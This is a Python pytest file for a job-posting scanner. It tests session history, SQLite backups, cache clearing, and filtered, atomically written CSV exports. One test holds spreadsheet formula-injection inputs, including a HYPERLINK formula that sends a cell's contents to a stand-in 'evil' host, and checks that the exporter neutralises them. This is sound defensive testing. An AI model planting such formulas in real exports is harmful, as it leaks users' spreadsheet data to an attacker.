"""Phase 5B-5E: History per session, backups, cache clearing, and exports that obey filters and cannot hurt a spreadsheet."""
import csv
import json
import os
import sqlite3
import threading
import time
from pathlib import Path

import pytest

from knowitall import export, fetch, maintenance, paths, store
from knowitall.normalize import make_job
from knowitall.service import Service


@pytest.fixture
def home(tmp_path, monkeypatch):
    """A private data folder: database, settings, exports and backups all inside tmp_path."""
    monkeypatch.setattr(store, "DB_PATH", tmp_path / "history.db")
    monkeypatch.setattr(store._local, "conn", None, raising=False)
    monkeypatch.setattr(paths, "EXPORTS_DIR", tmp_path / "exports")
    monkeypatch.setattr(paths, "BACKUPS_DIR", tmp_path / "backups")
    monkeypatch.setattr(paths, "CACHE_DIR", tmp_path / "cache")
    store.init()
    yield tmp_path
    conn = getattr(store._local, "conn", None)
    if conn:
        conn.close()
    store._local.conn = None


@pytest.fixture
def service(home):
    return Service(settings_path=home / "settings.json")


def seed(service, domain="acme.com", rows=(("Remote US", "remote", "US"), ("Office DE", "onsite", "DE"), ("Unsure", None, None))):
    session = service.session_id or service.begin_session()
    run = store.start_run(domain, "Acme", session)
    batch = [make_job("Acme", t, f"https://{domain}/jobs/{i}", location="x", workplace=w, country=c) for i, (t, w, c) in enumerate(rows)]
    store.mark_new(batch, domain)
    store.save_jobs(run, batch)
    store.finish_run(run, "done", "lever", len(batch), len(batch), complete=True, outcome="found", outcome_detail=f"{len(batch)} postings")
    return run


# ---------- History (5B) ----------

def test_history_shows_this_sessions_scans_with_outcome_and_matches(service):
    old = store.start_session()
    store.finish_run(store.start_run("old.com", "Old", old), "done", "x", 1, 1)
    run = seed(service)
    plain = service.history()["runs"]
    assert [r["domain"] for r in plain] == ["acme.com"] and plain[0]["outcome"] == "found" and "matches" not in plain[0]
    assert len(service.history(session="all")["runs"]) == 2
    filtered = service.history(filters={"workplace": ["remote"]})["runs"]
    assert filtered[0]["id"] == run and filtered[0]["matches"] == 1
    with pytest.raises(ValueError):
        service.history(session="never")


def test_the_history_and_jobs_endpoints_take_a_session(app):
    app.service.begin_session()
    seed(app.service)
    get = lambda path: json.loads(app.call("GET", path, None, app.auth)[1])
    assert len(get("/api/history")["runs"]) == 1 and get("/api/history?workplace=remote")["runs"][0]["matches"] == 1
    assert get("/api/jobs?facets=0")["total"] == 3
    store.start_session()                                                # a different (newer) launch
    app.service.session_id = store.start_session()
    assert get("/api/jobs?facets=0")["total"] == 0 and get("/api/jobs?facets=0&session=all")["total"] == 3
    assert app.call("GET", "/api/jobs?session=bogus", None, app.auth)[0] == 400
    assert get("/api/history?session=all")["runs"]


# ---------- backups (5C) ----------

def test_a_backup_made_during_an_open_write_is_a_valid_database_with_the_same_rows(service, home):
    seed(service)
    blocker = sqlite3.connect(str(home / "history.db"), timeout=1)
    blocker.execute("BEGIN IMMEDIATE")
    blocker.execute("INSERT INTO sessions (id, started_at) VALUES ('uncommitted', 'x')")          # an open, uncommitted write
    info = service.create_backup("manual")
    blocker.rollback(); blocker.close()
    copy = sqlite3.connect(str(home / "backups" / info["name"]))
    assert copy.execute("PRAGMA integrity_check").fetchone()[0] == "ok"
    assert copy.execute("SELECT COUNT(*) FROM postings").fetchone()[0] == 3
    assert copy.execute("SELECT COUNT(*) FROM sessions WHERE id = 'uncommitted'").fetchone()[0] == 0
    assert info["kind"] == "manual" and info["bytes"] > 0 and info["name"].endswith("-manual.db")


def test_a_backup_also_copies_the_settings(service, home):
    seed(service)
    service.update_settings({"theme": "light"})
    info = service.create_backup("manual")
    copied = home / "backups" / (info["name"][:-3] + "-settings.json")
    assert json.loads(copied.read_text())["theme"] == "light"


def test_backup_names_never_collide(service, home):
    seed(service)
    names = {service.create_backup("manual")["name"] for _ in range(3)}
    assert len(names) == 3 and len(service.list_backups()) == 3


def test_automatic_backups_keep_the_last_ten_and_manual_ones_are_never_deleted(service, home):
    seed(service)
    manual = [service.create_backup("manual")["name"] for _ in range(2)]
    for n in range(14):
        service.create_backup("auto")
        time.sleep(0.002)
    backups = service.list_backups()
    assert sum(b["kind"] == "auto" for b in backups) == 10
    assert {b["name"] for b in backups if b["kind"] == "manual"} == set(manual)
    leftovers = {p.name for p in (home / "backups").glob("*-settings.json")}
    assert len(leftovers) <= 12                                          # a removed backup takes its settings copy with it


def test_the_launch_backup_happens_only_when_the_data_changed(service, home):
    assert service.auto_backup() is None                                  # nothing scanned yet: nothing worth keeping
    seed(service)
    first = service.auto_backup()
    assert first and first["kind"] == "auto"
    assert service.auto_backup() is None and service.auto_backup() is None        # relaunching does not pile up copies
    seed(service, "other.io")
    assert service.auto_backup() is not None                              # something changed: a new one
    assert sum(b["kind"] == "auto" for b in service.list_backups()) == 2


def test_ten_quick_relaunches_cannot_push_out_an_older_backup(service):
    seed(service)
    first = service.auto_backup()["name"]
    for _ in range(12):
        service.auto_backup()
    assert [b["name"] for b in service.list_backups()] == [first]


def test_the_launch_backup_can_be_switched_off(service):
    seed(service)
    service.update_settings({"auto_backup": False})
    assert service.auto_backup() is None and service.list_backups() == []


def test_the_backup_endpoints(app, home):
    seed(app.service)
    status, body, _ = app.call("POST", "/api/backups", {}, app.json)
    assert status == 200 and json.loads(body)["backup"]["kind"] == "manual"
    listed = json.loads(app.call("GET", "/api/backups", None, app.auth)[1])["backups"]
    assert len(listed) == 1 and set(listed[0]) == {"name", "kind", "bytes", "created"}
    opened = []
    app.service._open_folder = lambda folder: opened.append(folder) or True
    assert json.loads(app.call("POST", "/api/backups/open-folder", {}, app.json)[1]) == {"opened": True}
    assert opened == [paths.BACKUPS_DIR]


# ---------- cache (5D) ----------

def test_clearing_the_cache_is_refused_while_a_scan_runs_and_clears_the_lookups(service, home, monkeypatch):
    (home / "cache").mkdir()
    (home / "cache" / "page.json").write_text("x" * 100)
    fetch._DNS["x.example"] = (True, time.monotonic() + 100)
    service.runner.running = True
    assert service.clear_cache() is None and (home / "cache" / "page.json").exists()
    service.runner.running = False
    result = service.clear_cache()
    assert result == {"files": 1, "bytes": 100} and not (home / "cache" / "page.json").exists()
    assert "x.example" not in fetch._DNS


def test_the_clear_cache_endpoint_says_409_while_scanning(app):
    app.service.runner.running = True
    assert app.call("POST", "/api/maintenance/clear-cache", {}, app.json)[0] == 409
    app.service.runner.running = False
    assert app.call("POST", "/api/maintenance/clear-cache", {}, app.json)[0] == 200


def test_the_startup_prune_uses_the_chosen_reuse_lifetime(tmp_path):
    cache = tmp_path / "cache"
    cache.mkdir()
    for name, age in (("old.json", 13 * 3600), ("hour.json", 2 * 3600), ("fresh.json", 60)):
        f = cache / name
        f.write_text("x")
        os.utime(f, (time.time() - age, time.time() - age))
    assert maintenance.prune_cache(cache, max_age_seconds=maintenance.REUSE_SECONDS["12h"]) == {"files": 1, "bytes": 1}
    assert maintenance.prune_cache(cache, max_age_seconds=maintenance.REUSE_SECONDS["1h"])["files"] == 1
    assert [p.name for p in cache.iterdir()] == ["fresh.json"]
    assert maintenance.prune_cache(cache, max_age_seconds=maintenance.REUSE_SECONDS["off"])["files"] == 1


# ---------- exports (5E, audit H7a and M8) ----------

def test_a_formula_looking_title_is_neutralised(home):
    jobs = [make_job("Acme", '=HYPERLINK("http://evil/?x="&A1,"Apply")', "https://x.com/1", location="+1 555"),
            make_job("Acme", "@SUM(A1)", "https://x.com/2"), make_job("Acme", "-2+3", "https://x.com/3"),
            make_job("Acme", "Normal", "https://x.com/4", location="Berlin")]
    path = export.write_csv(jobs, home / "x.csv")
    rows = list(csv.DictReader(open(path, encoding="utf-8-sig", newline="")))
    assert rows[0]["title"].startswith("'=HYPERLINK") and rows[0]["location"] == "'+1 555"
    assert rows[1]["title"] == "'@SUM(A1)" and rows[2]["title"] == "'-2+3" and rows[3]["title"] == "Normal"
    assert export.safe_cell("\tx") == "'\tx" and export.safe_cell("\rx") == "'\rx" and export.safe_cell(5) == 5 and export.safe_cell(None) is None


def test_files_are_written_atomically_and_never_half_written(home, monkeypatch):
    target = home / "out.csv"
    export.write_csv([make_job("A", "Old", "https://x.com/1")], target)
    before = target.read_bytes()
    real = csv.DictWriter.writerows

    def boom(self, rows):
        real(self, [next(iter(rows))])
        raise RuntimeError("disk full")
    monkeypatch.setattr(csv.DictWriter, "writerows", boom)
    with pytest.raises(RuntimeError):
        export.write_csv([make_job("A", "New", "https://x.com/2")] * 2, target)
    assert target.read_bytes() == before                               # the old file is untouched
    assert [p.name for p in home.iterdir() if p.name.endswith(".tmp")] == []


def test_a_locked_file_gets_a_numbered_name_and_the_caller_is_told(home, monkeypatch):
    target = home / "jobs_x.csv"
    export.write_csv([make_job("A", "T", "https://x.com/1")], target)
    real, calls = os.replace, []

    def locked(src, dst):
        calls.append(str(dst))
        if str(dst) == str(target):
            raise PermissionError("in use")                            # Excel has it open
        return real(src, dst)
    monkeypatch.setattr(os, "replace", locked)
    told = []
    written = export.write_csv([make_job("A", "T2", "https://x.com/2")], target, on_renamed=lambda wanted, used: told.append((wanted.name, used.name)))
    assert written.name == "jobs_x (1).csv" and told == [("jobs_x.csv", "jobs_x (1).csv")]


def test_a_locked_export_raises_a_notice_in_the_window(service, home, monkeypatch):
    seed(service)
    export.write_csv([make_job("A", "T", "https://x.com/1")], paths.EXPORTS_DIR / "knowitall_session_old.csv")
    service._notice_renamed(Path("a.csv"), Path("a (1).csv"))
    assert service.runner.snapshot()["notices"][0]["code"] == "export_locked"


def test_a_filtered_export_holds_only_matching_rows_and_says_so(service, home):
    seed(service)
    service.set_filters({"workplace": ["remote"]})
    result = service.export_session()
    assert result["rows"] == 1 and result["filtered"] is True
    name = Path(result["written"]).name
    assert name.startswith("knowitall_session_") and name.endswith("_filtered.csv")
    rows = list(csv.DictReader(open(result["written"], encoding="utf-8-sig", newline="")))
    assert [r["title"] for r in rows] == ["Remote US"]
    note = Path(result["written"]).with_suffix(".txt").read_text()
    assert "Filters: Remote" in note and "Postings: 1 of 3" in note


def test_the_window_can_send_its_own_current_filters(service):
    seed(service)
    result = service.export_session({"workplace": ["onsite"], "q": "office"})
    assert result["rows"] == 1 and result["filtered"]
    assert service.export_session({"workplace": ["sideways"]})["filtered"] is False          # an invalid filter is ignored, not fatal


def test_everything_scope_ignores_the_filters(service):
    seed(service)
    service.set_filters({"workplace": ["remote"]})
    service.update_settings({"export_scope": "everything"})
    result = service.export_session()
    assert result["rows"] == 3 and result["filtered"] is False and "_filtered" not in result["written"]
    with pytest.raises(ValueError):
        service.update_settings({"export_scope": "some"})


def test_no_filters_means_an_unfiltered_export_and_nothing_to_export_says_so(service):
    assert service.export_session() == {"written": None, "rows": 0, "filtered": False}
    seed(service)
    result = service.export_session()
    assert result["rows"] == 3 and not result["filtered"] and Path(result["written"]).name.startswith("knowitall_session_")
    assert not Path(result["written"]).with_suffix(".txt").exists()


def test_the_session_export_only_holds_this_sessions_postings(service):
    seed(service, "mine.com")
    other = store.start_session()
    run = store.start_run("theirs.com", "T", other)
    store.save_jobs(run, [make_job("T", "Old", "https://theirs.com/1")])
    store.finish_run(run, "done", "x", 1, 1)
    assert service.export_session()["rows"] == 3


def test_per_company_autosave_files_obey_the_filters(service, home):
    run = seed(service)
    service.set_filters({"workplace": ["remote"]})
    jobs = store.run_jobs(run)
    service._export_company("acme.com", run, jobs)
    out = paths.EXPORTS_DIR
    assert (out / "jobs_acme.com_filtered.csv").exists() and (out / "jobs_acme.com_filtered.txt").exists()
    data = json.loads((out / "jobs_acme.com_filtered.json").read_text())
    assert data["filters"] == "Remote" and data["matching"] == 1 and data["total"] == 3 and [j["title"] for j in data["jobs"]] == ["Remote US"]
    service.set_filters({})
    service._export_company("acme.com", run, jobs)
    plain = json.loads((out / "jobs_acme.com.json").read_text())
    assert isinstance(plain, list) and len(plain) == 3                       # unfiltered files keep the plain list shape


def test_the_output_list_puts_this_sessions_files_first(service, home):
    seed(service)
    old = paths.EXPORTS_DIR / "jobs_old.com.csv"
    export.write_csv([make_job("A", "T", "https://old.com/1")], old)
    os.utime(old, (time.time() - 86400 * 3, time.time() - 86400 * 3))
    service.export_session()
    files = service.list_exports()
    assert files[0]["name"].startswith("knowitall_session_") and files[0]["this_session"] is True
    assert files[-1]["name"] == "jobs_old.com.csv" and files[-1]["this_session"] is False
    assert all(f["rows"] is not None for f in files)


def test_the_exports_folder_defaults_to_the_real_documents_folder(monkeypatch, tmp_path):
    from platformdirs import user_documents_dir
    monkeypatch.delenv("KNOWITALL_HOME", raising=False)
    monkeypatch.delenv("KNOWITALL_EXPORTS", raising=False)
    assert paths._resolve()[1] == Path(user_documents_dir()) / "KnowItAll" / "exports"
